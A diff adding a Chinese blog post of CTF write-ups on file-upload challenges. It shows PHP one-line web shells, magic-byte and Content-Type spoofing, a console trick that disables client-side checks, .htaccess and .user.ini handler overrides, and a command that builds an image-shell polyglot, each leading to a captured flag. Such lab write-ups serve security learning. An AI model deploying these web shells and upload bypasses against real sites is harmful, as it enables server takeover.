@@ -1,0 +1,263 @@
+---
+layout: post
+title:  UPLOAD
+date:   2021-07-24 00:01:01 +0300
+image:  2021-07-24-flowers.jpg
+tags:   [ctf,web,upload]
+---
+
+CTF文件上传题中常用的php拓展名:
+
+- 利用中间件解析漏洞绕过检查，实战常用
+- 上传.user.ini或.htaccess将合法拓展名文件当作php文件解析
+- %00截断绕过
+- php3文件
+- php4文件
+- php5文件
+- php7文件
+- phtml文件
+- phps文件
+- pht文件
+
+### [极客大挑战 2019]Upload
+
+先上传一个php
+
+```assembly
+<?php @eval($_POST['hacker']); ?>
+```
+
+显示
+
+`Not image!`
+
+试一下phtml，phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析
+
+```assembly
+<script language="php">eval($_POST['shell']);</script> 
+```
+
+同时burpsuite拦截，将Content-Type改为`image/jpg`
+
+显示
+
+`Don't lie to me, it's not image at all!!!`
+
+修改文件头，那就加上GIF89a
+
+```assembly
+GIF89a
+<script language="php">eval($_POST['melody']);</script> 
+```
+
+再传，将Content-Type改为`image/jpg`
+
+上传成功，显示
+
+`上传文件名: b.phtml`
+
+猜测上传后的文件在/upload/b.phtml，浏览器输入该地址验证，有显示，说明是该路径。
+
+使用蚁剑连接。
+
+flag{51e6c344-c9bc-4568-ac5b-7e30ed4e4ce5}
+
+### [ACTF2020 新生赛]Upload
+
+传了一个phtml文件，
+
+```assembly
+GIF89a
+<script language="php">eval($_POST['melody']);</script> 
+```
+
+显示
+
+`该文件不允许上传，请上传jpg、png、gif结尾的图片噢！`
+
+F12发现检查在前端，`/js/main.js`
+
+```assembly
+function checkFile() {
+    var file = document.getElementsByName('upload_file')[0].value;
+    if (file == null || file == "") {
+        alert("璇烽€夋嫨瑕佷笂浼犵殑鏂囦欢!");
+        return false;
+    }
+    //瀹氫箟鍏佽涓婁紶鐨勬枃浠剁被鍨�
+    var allow_ext = ".jpg|.png|.gif";
+    //鎻愬彇涓婁紶鏂囦欢鐨勭被鍨�
+    var ext_name = file.substring(file.lastIndexOf("."));
+    //鍒ゆ柇涓婁紶鏂囦欢绫诲瀷鏄惁鍏佽涓婁紶
+    if (allow_ext.indexOf(ext_name) == -1) {
+        var errMsg = "璇ユ枃浠朵笉鍏佽涓婁紶锛岃涓婁紶jpg銆乸ng銆乬if缁撳熬鐨勫浘鐗囧櫌锛�";
+        alert(errMsg);
+        return false;
+    }
+}
+```
+
+直接修改前端，删除form标签的`onsubmit="return checkFile()"`，不行，原来是要在console里将checkFile函数置空
+
+```assembly
+checkFile={}
+```
+
+上传刚才的文件，显示
+
+`嘿伙计，你发现它了！`
+
+`Upload Success! Look here~ ./uplo4d/085efa22dc274944b80b550bc5cf7deb.phtml`
+
+蚁剑连接。
+
+flag{24b96f03-50ee-42d2-bd5f-d502886b425d}
+
+### [MRCTF2020]你传你🐎呢
+
+上传一句话马，后缀保存为jpg
+
+```assembly
+<?php @eval($_POST['melody']) ?>
+```
+
+上传成功，路径`upload/b7efa9c9c1b76fa145cbafb014376450/a.jpg`
+
+然后上传文件.htaccess，将.jpg解析成.php
+
+```assembly
+<FilesMatch "1.jpg">
+SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+需要把Content-Type改为：`image/png`，不知道为什么改成`image/jpg`不行。
+
+蚁剑连接
+
+flag{bbe96ed8-0dd2-47a7-b1da-32b88e66aceb}
+
+### [GXYCTF2019]BabyUpload
+
+试了一下上传格式不支持.jpg和.gif，但是可以用png
+
+上传普通的一句话会被和谐掉，大佬说可能过滤了 <?  
+
+用js引用php可以绕过过滤
+
+```assembly
+GIF89a
+<script language="php">eval($_POST['shell']);</script> 
+```
+
+要把Content-Type改为：`image/jpeg`
+
+上传成功
+
+`/var/www/html/upload/100fbac94abfa6b2bc897ece753c008b/js.png succesfully uploaded!`
+
+上传.htaccess文件
+
+Content-Type改为：`image/jpeg`
+
+flag{64bfb6f3-2b52-4dac-8601-74b6761f2828}
+
+### [SUCTF 2019]CheckIn
+
+上传了一个.phtml文件，显示
+
+`illegal suffix!`
+
+改为png上传，显示
+
+`<? in contents!`
+
+内容改为
+
+```assembly
+GIF89a
+<script language="php">eval($_POST['shell']);</script> 
+```
+
+上传，显示
+
+`Your dir uploads/a2dac6bd7c61bc58189816aab5957f01
+Your files :
+array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "index.php" [3]=> string(5) "s.png" }`
+
+上传.htaccess文件，显示
+
+`exif_imagetype:not image!`
+
+说明网页后端使用**exif_imagetype**检查上传文件的类型
+
+给上传文件加上相应的幻数头字节就可以绕过：
+
+- JPG ：FF D8 FF E0 00 10 4A 46 49 46
+- GIF(相当于文本的GIF89a)：47 49 46 38 39 61
+- PNG： 89 50 4E 47
+
+上传.htaccess，显示
+
+`Your dir uploads/a2dac6bd7c61bc58189816aab5957f01
+Your files :
+array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".htaccess" [3]=> string(9) "index.php" }`
+
+蚁剑连接，失败
+
+原来，这个服务器是nginx，而.htaccess是针对apache的
+
+看wp
+
+`.user.ini`。它比`.htaccess`用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。
+
+php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：`PHP_INI_SYSTEM`、`PHP_INI_PERDIR`、`PHP_INI_ALL`、`PHP_INI_USER`。
+
+`.user.ini`实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。
+
+实际上，除了`PHP_INI_SYSTEM`以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。而且，和`php.ini`不同的是，`.user.ini`是一个能被动态加载的ini文件。也就是说修改了`.user.ini`后，不需要重启服务器中间件，只需要等待`user_ini.cache_ttl`所设置的时间（默认为300秒），即可被重新加载。
+
+| 名字              | 默认 | 可修改范围     | 更新日志 |
+| :---------------- | :--- | :------------- | :------- |
+| auto_append_file  | NULL | PHP_INI_PERDIR |          |
+| auto_prepend_file | NULL | PHP_INI_PERDIR |          |
+
+auto_append_file
+
+指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：
+
+```assembly
+auto_prepend_file=shell.jpg
+```
+
+winhex添加文件头，上传，显示
+
+`Your dir uploads/a2dac6bd7c61bc58189816aab5957f01
+Your files :
+array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".user.ini" [3]=> string(9) "index.php" }`
+
+制作图片马
+
+s.php
+
+```assembly
+<script language="php">eval($_POST['a']);</script>
+```
+
+```assembly
+copy hair.jpg/a + s.php/b shell.jpg
+```
+
+上传图片马
+
+`Your dir uploads/a2dac6bd7c61bc58189816aab5957f01
+Your files :
+array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".user.ini" [3]=> string(9) "index.php" [4]=> string(9) "shell.jpg" }`
+
+蚁剑连接
+
+`http://969943a9-a160-4cf8-b5bb-874d44cba7b8.node4.buuoj.cn:81/uploads/a2dac6bd7c61bc58189816aab5957f01/index.php`
+
+得到flag
+
+flag{534ef74d-fcbd-4d49-83ed-36953200a311}
